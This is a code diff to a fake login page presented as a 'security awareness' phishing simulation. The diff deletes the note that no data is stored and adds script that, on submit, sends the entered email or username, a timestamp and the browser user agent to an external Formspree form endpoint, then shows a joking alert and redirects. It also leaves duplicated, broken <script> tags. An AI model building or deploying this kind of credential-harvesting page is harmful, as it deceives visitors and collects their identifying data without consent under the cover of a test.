@@ -103,16 +103,35 @@ button:hover{
 </div>
 
 <script>
+<script>
 function handleLogin(e){
   e.preventDefault();
 
-  // ⚠️ No data stored (safe simulation)
+  const email = document.querySelector('input[type="email"]')?.value 
+             || document.querySelector('input[type="text"]')?.value;
 
-  alert("Security Awareness Test\n\nYou just attempted to enter credentials on a simulated phishing page.\n\nAlways verify links before logging in.");
+  // ✅ send to Formspree (ONLY email/username)
+  fetch("https://formspree.io/f/YOUR_FORM_ID", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Accept": "application/json"
+    },
+    body: JSON.stringify({
+      email: email,
+      action: "login_attempt",
+      time: new Date().toISOString(),
+      device: navigator.userAgent
+    })
+  });
 
-  // redirect to your page
+  // ✅ message
+  alert("⚠️ Security Awareness Test\n\nBro it was a tester 😄");
+
+  // ✅ redirect
   window.location.href = "https://shabbirspro.github.io/portalsss/";
 }
+</script>
 </script>
 
 </body>
